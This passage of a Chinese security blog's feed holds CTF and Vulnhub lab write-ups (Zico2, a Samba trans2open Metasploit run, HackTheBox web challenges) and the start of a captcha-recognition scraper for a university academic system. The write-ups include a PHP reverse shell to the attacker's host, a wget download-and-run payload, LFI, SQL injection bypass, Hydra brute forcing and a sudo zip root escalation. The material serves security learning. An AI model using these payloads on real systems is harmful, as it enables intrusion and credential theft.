2.2.0到2.2.8版本中发现的缓冲区溢出.</p><p>同样可以在<code>searchsploit</code>查到</p><p>这里直接用msf环境进行实验。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(linux/samba/trans2open) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/samba/trans2open):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   RHOST  192.168.43.54   yes       The target address</span><br><span class="line">   RPORT  139              yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (linux/x86/shell_bind_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line">   RHOST  192.168.43.54   no        The target address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Samba 2.2.x - Bruteforce</span><br><span class="line"></span><br><span class="line">msf exploit(linux/samba/trans2open) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started bind handler</span><br><span class="line">[*] 192.168.43.54:139 - Trying return address 0xbffffdfc...</span><br><span class="line">[*] 192.168.43.54:139 - Trying return address 0xbffffcfc...</span><br><span class="line">[*] 192.168.43.54:139 - Trying return address 0xbffffbfc...</span><br><span class="line">[*] 192.168.43.54:139 - Trying return address 0xbffffafc...</span><br><span class="line">[*] Command shell session 2 opened (192.168.43.177:33375 -&gt; 192.168.43.54:4444) at 2018-05-07 04:47:42 -0400</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=99(nobody)</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>虽然说这个实验环境比较老，一些漏洞可能在现实的实战中是很少存在的。但是在这个漏洞利用的过程中可以学到一些<code>kali linux</code>的工具的利用和一些实战的思路。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;p&gt;通过&lt;code&gt;netdiscover&lt;/code&gt;发现目标主机IP地址。&lt;/p&gt;
&lt;figure class=&quot;highl
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>Vulnhub渗透测试练习 - Zico2</title>
    <link href="https://uknowsec.cn/posts/notes/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BB%83%E4%B9%A0-Zico2.html"/>
    <id>https://uknowsec.cn/posts/notes/vulnhub渗透测试练习-Zico2.html</id>
    <published>2018-05-05T14:30:35.000Z</published>
    <updated>2018-05-05T17:15:40.737Z</updated>
    
    <content type="html"><![CDATA[<h2 id="vulnhub渗透环境"><a href="#vulnhub渗透环境" class="headerlink" title="vulnhub渗透环境"></a>vulnhub渗透环境</h2><h3 id="靶机地址"><a href="#靶机地址" class="headerlink" title="靶机地址"></a>靶机地址</h3><p><a href="https://www.vulnhub.com/entry/zico2-1,210/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/zico2-1,210/</a></p><h3 id="练习环境"><a href="#练习环境" class="headerlink" title="练习环境"></a>练习环境</h3><ul><li>Kali Linux </li><li>VirtualBox</li></ul><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>在信息收集之前需要获取到靶机的IP地址，我靶机在VirtualBox下是<code>Host-Only</code>网络模式，而靶机是无法直接进入系统看到IP地址的。</p><p>这里用到一个kali linux下的一个工具<code>netdiscover</code>基于ARP的网络扫描工具。</p><p>直接执行命令<code>netdiscover</code>:</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20180505223944.png" alt=""></p><p>这里我们获取到两个IP地址，测试发现正确的是<code>192.168.56.102</code></p><p>接下来用<code>nmap</code>扫描端口信息</p><p><code>nmap -A 192.168.56.102</code></p><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20180505224409.png" alt=""></p><p>得到80端口上运行着一个Web服务器。</p><p>访问该Web服务，在这个时候我们可以用常见的扫描工具对网站进行扫描</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这里我简单对页面进行浏览，发现了一个文件包含漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?page=tools.html</span><br></pre></td></tr></table></figure><p>尝试包含<code>../../etc/passwd</code></p><p><img src="http://obr4sfdq7.bkt.clouddn.com/vlunhub_zico2_1.png" alt=""></p><p>成功包含，解下来就尝试扫描目录，因为校园网的原因，只能用<code>Host-Only</code>网络模式进行测试，所以一切测试过程都在<code>Kali</code>下进行</p><p>这里尝试去扫描网站的目录，用到<code>kali</code>下的<code>dirb</code>专门用于爆破目录的工具。</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/vlunhub_zico2_2.png" alt=""></p><p>得到一个<code>dbadmin</code>的目录</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/vlunhub_zico2_3.png" alt=""></p><p><img src="http://obr4sfdq7.bkt.clouddn.com/vlunhub_zico2_4.png" alt=""></p><p>这里用到的是一个叫<code>phpLiteAdmin</code>服务器应用，版本号为<code>v1.9.3</code></p><p>尝试找找这个版本的历史漏洞，这个服务是存在一个远程PHP代码注入漏洞的。</p><p>这里可以通过搜索引擎搜索相关漏洞详情也可以用<code>kali</code>下的<code>Searchsploit</code>一个用于Exploit-DB的命令行搜索工具。</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/vlunhub_zico2_5.png" alt=""></p><p>这样们就可以看到漏洞详情，这里我们可以看到利用这个远程PHP代码注入漏洞需要登录的。</p><p>所以尝试默认密码<code>admin</code>，发现可以直接登录进去。</p><p>从<code>exploit-db</code>上的资料可以看出，我们需要创建一个数据库，写入一个shell。</p><p>这里可以用nc监听端口来反弹shell，也可以用msf生成php目录进行监听。</p><p>按照<code>exploit-db</code>所说的建立数据库。这里直接创建一个后缀名为<code>.php</code>的数据库<code>shell</code></p><p><img src="http://obr4sfdq7.bkt.clouddn.com/vlunhub_zico2_6.png" alt=""></p><p>并添加表信息</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/vlunhub_zico2_7.png" alt=""></p><p>这里在本地的<code>/var/www/html</code>目录下创建txt文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $sock=fsockopen(&quot;192.168.56.101&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);?&gt;</span><br></pre></td></tr></table></figure><p>然后启动apache web服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure><p>然后返回到数据库中添加字段名，类型为<code>TEXT</code>,写入PHP代码来下载执行shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;wget 192.168.56.101/shell.txt -O /tmp/shell.php; php /tmp/shell.php&quot;); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="http://obr4sfdq7.bkt.clouddn.com/vlunhub_zico2_8.png" alt=""></p><p>需要让目标下载执行这串恶意代码，需要一个HTTP请求。</p><p>这里我们就可以利用到之前发现的本地文件包含的漏洞了。</p><p>我们可以在数据库中发现我们恶意创建的数据库的路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/databases/shell.php</span><br></pre></td></tr></table></figure><p>先用nc监听我们之前设置的端口<code>2333</code></p><p><img src="http://obr4sfdq7.bkt.clouddn.com/vlunhub_zico2_9.png" alt=""></p><p>这里我们就可以反弹一个shell了。</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>在反弹了shell后，对目录进行检查发现了</p><p>/home/zico中有一个<code>wordpress</code>目录，是一个常见的CMS</p><p>进入查看wp-config.php文件。</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/vlunhub_zico2_10.png" alt=""></p><p>发现了用户zico的登录凭证，我们可以用<code>ssh</code>来连接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh zico@192.168.56.102</span><br></pre></td></tr></table></figure><p>利用<code>sudo -l</code>查看目前用户可执行与无法执行的指令；</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/vlunhub_zico2_11.png" alt=""></p><p>这里表明当前用户<code>zico</code>可以利用root权限无密码执行<code>tar</code>和<code>zip</code>命令</p><p>这里可以利用<code>touch exploit</code>创建一个随机文件，并用<code>zip</code>命令进行压缩</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo zip exploit.zip exploit -T --unzip-command=&quot;python -c &apos;import pty; pty.spawn(\&quot;/bin/sh\&quot;)&apos;&quot;</span><br></pre></td></tr></table></figure><ul><li>sudo 用管理员权限执行</li><li>-T 检查文件的完整性。这个参数可以让他执行下一个参数 –unzip-command，在这个参数中写入一个python的交互shell</li></ul><p><img src="http://obr4sfdq7.bkt.clouddn.com/vlunhub_zico2_12.png" alt=""></p><p>由此的到<code>root</code>权限，接下来就可以进入<code>/root</code>目录了</p><p><code>cat /root/flag.txt</code>得到flag。</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/vlunhub_zico2_13.png" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>vulnhub里面有很多不同的环境提供渗透，第一次完成一次完整的渗透过程，学到了很多东西。</li><li>在文章的开头用到了<code>kali linux</code>下的一个工具<code>netdiscover</code>基于ARP的网络扫描工具。记得在一个师傅的面试经验介绍中，他被面试官问到为什么要用arp去探测内网主机，他回答的是相当隐蔽，探测的信息更准确。主要是因为传统探测远程主机是否存活的方法是通过ICMP协议中的回显应答报文来探测(ping)。很多主机为了避免被扫描器探测，通过防火墙将ICMP包屏蔽，从而达到在网络中隐藏的目的。</li><li>在文章中用到了两种语言的交互shell。分别是php和python，这里参考老外的博客<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">Reverse Shell Cheat Sheet</a></li><li>对于我个人在提权实战经验方面是十分少的，在这次练习中学到了可以利用<code>touch exploit</code>创建一个随机文件，并用<code>zip</code>命令进行压缩，由此可见还是自己的实战经验太少了。</li><li>最后感概下，英文的重要性。国外很多大牛的博客都是很丰富的，而对于一个英语四级425飘过的菜鸡，我也是很无奈的。只能靠百度翻译了。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;vulnhub渗透环境&quot;&gt;&lt;a href=&quot;#vulnhub渗透环境&quot; class=&quot;headerlink&quot; title=&quot;vulnhub渗透环境&quot;&gt;&lt;/a&gt;vulnhub渗透环境&lt;/h2&gt;&lt;h3 id=&quot;靶机地址&quot;&gt;&lt;a href=&quot;#靶机地址&quot; class=&quot;
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>hackthebox web challenges</title>
    <link href="https://uknowsec.cn/posts/notes/Hackthebox-Web-Challenges.html"/>
    <id>https://uknowsec.cn/posts/notes/Hackthebox-Web-Challenges.html</id>
    <published>2018-05-05T08:42:38.000Z</published>
    <updated>2018-05-05T09:39:37.514Z</updated>
    
    <content type="html"><![CDATA[<h2 id="HDC"><a href="#HDC" class="headerlink" title="HDC"></a>HDC</h2><p>根据题目给出来的提示</p><p><code>Enter your credentials and press [Submit] to access the company&#39;s Control Panel.</code></p><p>并查看源码发现</p><p><code>&lt;input type=&quot;button&quot; value=&quot;Submit&quot; onclick=&quot;doProcess()&quot;/&gt;</code></p><p>在myscripts.js里发现了<code>doProcess()</code>函数</p><p>同时在jquery-3.2.1.js也发现了<code>doProcess()</code>函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function doProcess() </span><br><span class="line">&#123;var form=document.createElement(&quot;form&quot;);form.setAttribute(&quot;method&quot;,&quot;post&quot;);form.setAttribute(&quot;action&quot;,&quot;main/index.php&quot;);form.setAttribute(&quot;target&quot;,&quot;view&quot;);var hiddenField=document.createElement(&quot;input&quot;);hiddenField.setAttribute(&quot;type&quot;,&quot;hidden&quot;);hiddenField.setAttribute(&quot;name&quot;,&quot;name1&quot;);hiddenField.setAttribute(&quot;value&quot;,&quot;TXlMaXR0bGU&quot;);var hiddenField2=document.createElement(&quot;input&quot;);hiddenField2.setAttribute(&quot;type&quot;,&quot;hidden&quot;);hiddenField2.setAttribute(&quot;name&quot;,&quot;name2&quot;);hiddenField2.setAttribute(&quot;value&quot;,&quot;cDB3bmll&quot;);form.appendChild(hiddenField2);form.appendChild(hiddenField);form.appendChild(hiddenField2);document.body.appendChild(form);window.open(&apos;&apos;,&apos;view&apos;);form.submit();&#125;</span><br></pre></td></tr></table></figure><p>由这里可以得到账号密码<code>TXlMaXR0bGU</code>和<code>cDB3bmll</code>。</p><p>进入系统可以看到有一个可以发邮箱的地方。</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20180505171357.png" alt=""></p><p>发现了一个目录<code>secret_area_</code>访问目录下的mails.txt得到一份邮箱表单。</p><p>尝试着用这份邮箱名单去发邮件。</p><p>这里用burp遍历</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20180505171719.png" alt=""></p><p>由此得到flag。</p><h2 id="Lernaean"><a href="#Lernaean" class="headerlink" title="Lernaean"></a>Lernaean</h2><p>这里的提示是</p><p><code>Your target is not very good with computers. Try and guess their password to see if they may be hiding anything!</code></p><p>因为英语比较差，所以搜了下lernaean发现是<code>水蛇许德拉(Lernaean Hydra)</code>的意思。</p><p><code>Hydra</code>一个用来破解密码的工具。所以尝试用<code>Hydra</code>来破解密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt 88.198.233.174 http-post-form &quot;/:password=^PASS^:Invalid password!&quot; -s 44134</span><br></pre></td></tr></table></figure><ul><li>-l 指定用户名</li><li>-P 指定字典</li><li>http-post-form POST请求</li><li>:Invalid password!” 密码错误输出的错误信息</li><li>-s 指定端口</li></ul><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20180505173240.png" alt=""></p><p>得到密码登录。页面返回。</p><p><code>Ooops! Too slow!</code></p><p>利用burp提交即可得到flag.</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20180505171719.png" alt=""></p><h2 id="Cartographer"><a href="#Cartographer" class="headerlink" title="Cartographer"></a>Cartographer</h2><p>进到页面是一个登录框，尝试万能密码</p><p><code>&#39; or 1=1#</code></p><p>至今进入页面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cartographer</span><br><span class="line">Is Still</span><br><span class="line">Under Construction!</span><br></pre></td></tr></table></figure><p>发现url中好像是文件包含，尝试info=flag</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20180505173920.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;HDC&quot;&gt;&lt;a href=&quot;#HDC&quot; class=&quot;headerlink&quot; title=&quot;HDC&quot;&gt;&lt;/a&gt;HDC&lt;/h2&gt;&lt;p&gt;根据题目给出来的提示&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Enter your credentials and press [Submit] 
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>hackthebox invite code</title>
    <link href="https://uknowsec.cn/posts/notes/hackthebox-invite-code.html"/>
    <id>https://uknowsec.cn/posts/notes/hackthebox-invite-code.html</id>
    <published>2018-05-05T08:41:38.000Z</published>
    <updated>2018-05-05T17:11:12.439Z</updated>
    
    <content type="html"><![CDATA[<p>一个国外的CTF站点，听群里的师傅说有很多模拟的内网环境，所以想上去试试水。</p><p>这个站点是注册是需要邀请码的，这里是一个简单的题目。</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20180505165024.png" alt=""></p><p>F12审核元素，可以看到<code>/js/inviteapi.min.js</code>得到一串javascript混淆之后的代码，解密得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">function verifyInviteCode(code) &#123;</span><br><span class="line">    var formData = &#123;</span><br><span class="line">        &quot;code&quot;: code</span><br><span class="line">    &#125;;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: &quot;POST&quot;,</span><br><span class="line">        dataType: &quot;json&quot;,</span><br><span class="line">        data: formData,</span><br><span class="line">        url: &apos;/api/invite/verify&apos;,</span><br><span class="line">        success: function(response) &#123;</span><br><span class="line">            console.log(response)</span><br><span class="line">        &#125;,</span><br><span class="line">        error: function(response) &#123;</span><br><span class="line">            console.log(response)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function makeInviteCode() &#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: &quot;POST&quot;,</span><br><span class="line">        dataType: &quot;json&quot;,</span><br><span class="line">        url: &apos;/api/invite/how/to/generate&apos;,</span><br><span class="line">        success: function(response) &#123;</span><br><span class="line">            console.log(response)</span><br><span class="line">        &#125;,</span><br><span class="line">        error: function(response) &#123;</span><br><span class="line">            console.log(response)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里定义了两个函数<code>makeInviteCode()</code>和<code>verifyInviteCode(code)</code></p><p>利用控制台调用<code>makeInviteCode()</code>得到base64密文</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20180505165530.png" alt=""></p><p>解密得到 <code>In order to generate the invite code, make a POST request to /api/invite/generate</code></p><p>用POST请求/api/invite/generate</p><p>burp构造一个POST请求</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20180505170039.png" alt=""></p><p>解密得到邀请码。另外在注册的时候发现，不扶墙是不能得到验证码的。但是扶墙之后，会发现得到的验证码跟代理IP的不匹配。</p><p>所以在做题的时候直接扶墙做题。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一个国外的CTF站点，听群里的师傅说有很多模拟的内网环境，所以想上去试试水。&lt;/p&gt;
&lt;p&gt;这个站点是注册是需要邀请码的，这里是一个简单的题目。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>正方教务系统验证码识别</title>
    <link href="https://uknowsec.cn/posts/notes/%E6%AD%A3%E6%96%B9%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB.html"/>
    <id>https://uknowsec.cn/posts/notes/正方教务系统验证码识别.html</id>
    <published>2018-04-19T05:50:37.000Z</published>
    <updated>2018-06-03T15:30:13.565Z</updated>
    
    <content type="html"><![CDATA[<h2 id="验证码预处理"><a href="#验证码预处理" class="headerlink" title="验证码预处理"></a>验证码预处理</h2><h3 id="下载验证码"><a href="#下载验证码" class="headerlink" title="下载验证码"></a>下载验证码</h3><h4 id="实现代码："><a href="#实现代码：" class="headerlink" title="实现代码："></a>实现代码：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_checkcode(i):</span><br><span class="line">    r = requests.get(&apos;http:///CheckCode.aspx?&apos;)</span><br><span class="line">    picname = str(i) + &apos;.png&apos;</span><br><span class="line">    with open(&apos;image\\&apos; + picname, &apos;wb&apos;) as f:</span><br><span class="line">        f.write(r.content)</span><br><span class="line">        print(&quot;downloading code %d.png&quot; % i,)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    for i in range(1, 1000):</span><br><span class="line">        get_checkcode(i)</span><br></pre></td></tr></table></figure><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><ul><li>利用requests库里的get方法访问生成验证码页面，并保存验证码图片到本地。</li></ul><h4 id="代码测试："><a href="#代码测试：" class="headerlink" title="代码测试："></a>代码测试：</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ截图20180418133234.png" alt="Alt text"></p><h3 id="灰度化、分割"><a href="#灰度化、分割" class="headerlink" title="灰度化、分割"></a>灰度化、分割</h3><h4 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from PIL import Image, ImageTk, ImageFilter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_checkcode(i):</span><br><span class="line">    r = requests.get(&apos;http:///CheckCode.aspx?&apos;)</span><br><span class="line">    picname = str(i) + &apos;.png&apos;</span><br><span class="line">    with open(&apos;image\\&apos; + picname, &apos;wb&apos;) as f:</span><br><span class="line">        f.write(r.content)</span><br><span class="line">        print(&quot;downloading code %d.png&quot; % i,)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def process_pic(i):</span><br><span class="line">    picname = str(i) + &apos;.png&apos;</span><br><span class="line">    im = Image.open(&apos;image\\&apos; + picname)</span><br><span class="line">    im = im.point(lambda i: i &gt; 43, mode=&apos;1&apos;)</span><br><span class="line">    im.save(picname)</span><br><span class="line">    y_min, y_max = 0, 22  # im.height - 1 # 26</span><br><span class="line">    split_lines = [5, 17, 29, 41, 53]</span><br><span class="line">    ims = [im.crop([u, y_min, v, y_max])</span><br><span class="line">           for u, v in zip(split_lines[:-1], split_lines[1:])]</span><br><span class="line">    return ims</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    for i in range(1, 5):</span><br><span class="line">        get_checkcode(i)</span><br><span class="line">        ims = process_pic(i)</span><br><span class="line">        print(&quot;saving code %d.png cutted&quot; % i)</span><br><span class="line">        for j in range(0, 4):</span><br><span class="line">            ims[j].save(str(i) + &apos;_&apos; + str(j) + &apos;.png&apos;)</span><br></pre></td></tr></table></figure><h4 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h4><ul><li><p>point()方法通过一个函数或者查询表对图像中的像素点进行处理，<code>im = im.point(lambda i: i &gt; 43, mode=&#39;1&#39;)</code><br>中<code>lambda i</code>遍历整张图片，<code>43</code>是一个阀值，大于<code>43</code>填充为<code>1</code>，小于<code>43</code>填充为<code>0</code>，<code>mode=&#39;1&#39;</code>的意思是输出模式为整数型，由此实现灰度化。</p></li><li><p><code>y_min, y_max = 0, 22</code>设定验证码图片中最大的y值和最小的y值。</p></li><li><p><code>zip(split_lines[:-1], split_lines[1:])</code> 运行结果为<code>[(5,17),(17,29),(29,41),(41,53)]</code></p></li><li><p><code>im.crop([u, y_min, v, y_max])</code> ，<code>crop()</code>函数为用来复制一个图片里的一矩形内容，传入参数为矩形的四条边。</p></li><li><p>所以通过以上的<code>crop()</code>函数实现图片的分割。</p></li></ul><h4 id="代码测试"><a href="#代码测试" class="headerlink" title="代码测试"></a>代码测试</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ截图20180418142427.png" alt="Alt text"></p><h3 id="标识"><a href="#标识" class="headerlink" title="标识"></a>标识</h3><h4 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h4><ul><li>利用Python的图形开发界面的库<code>tkinter</code>将验证码图片显示在一个图形化的界面，供人工标识验证码。</li><li><code>resize()</code>函数将爬虫爬取的验证码放大，利于辨别。</li><li><code>display_pic()</code>函数中<code>tk.PhotoImage()</code>方法插入图片。</li></ul><h4 id="实现代码-1"><a href="#实现代码-1" class="headerlink" title="实现代码"></a>实现代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">def get_pic_for_display(i):</span><br><span class="line">    picname = str(i) + &apos;.png&apos;</span><br><span class="line">    im = Image.open(picname)</span><br><span class="line">    w, h = im.size</span><br><span class="line">    w_box = 300</span><br><span class="line">    h_box = 200</span><br><span class="line">    im_resized = resize(w, h, w_box, h_box, im)</span><br><span class="line">    tk_image = ImageTk.PhotoImage(im_resized)</span><br><span class="line">    return tk_image</span><br><span class="line"></span><br><span class="line">def resize(w, h, w_box, h_box, pil_image):</span><br><span class="line">    f1 = w_box / w</span><br><span class="line">    f2 = h_box / h</span><br><span class="line">    factor = min([f1, f2])</span><br><span class="line">    width = int(w * factor)</span><br><span class="line">    height = int(h * factor)</span><br><span class="line">    return pil_image.resize((width, height), Image.ANTIALIAS)</span><br><span class="line"></span><br><span class="line">def display_pic():</span><br><span class="line">    global im</span><br><span class="line">    tmp = get_cnt() + 1</span><br><span class="line">    get_checkcode(tmp)</span><br><span class="line">    im = tk.PhotoImage(file= str(tmp)+&apos;.png&apos;)</span><br><span class="line">    im = get_pic_for_display(tmp)</span><br><span class="line">    picLabel[&apos;image&apos;] = im</span><br><span class="line">    cntLabel[&apos;text&apos;] = &apos;总计: &apos; + str(tmp-1) + &apos;/1000&apos;</span><br></pre></td></tr></table></figure><h4 id="代码测试-1"><a href="#代码测试-1" class="headerlink" title="代码测试"></a>代码测试</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ截图20180419122240.png" alt="Alt text"></p><h3 id="归类"><a href="#归类" class="headerlink" title="归类"></a>归类</h3><h4 id="代码分析-3"><a 